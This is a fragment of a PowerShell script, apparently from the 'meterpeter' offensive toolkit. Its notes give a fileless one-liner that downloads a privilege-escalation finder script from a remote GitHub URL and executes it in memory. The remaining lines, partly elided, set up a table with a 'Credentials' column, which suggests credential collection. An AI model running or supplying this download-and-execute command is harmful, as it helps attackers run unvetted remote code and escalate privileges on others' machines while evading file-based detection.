...
.NOTES
   FileLess Execute FindEOP.ps1 CmdLet:
   $Proxy=New-Object -ComObject MsXml2.ServerXmlHttp;$Proxy.Open('GET','https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/FindEop.ps1',0);$Proxy.Send();[scriptblock]::Create($Proxy.ResponseText).Invoke()
...
If(Test-Path -Path "$Env:USERPROFILE\Desktop" -EA SilentlyContinue)
{
   ...
   $credstable.Columns.Add("Credentials")|Out-Null
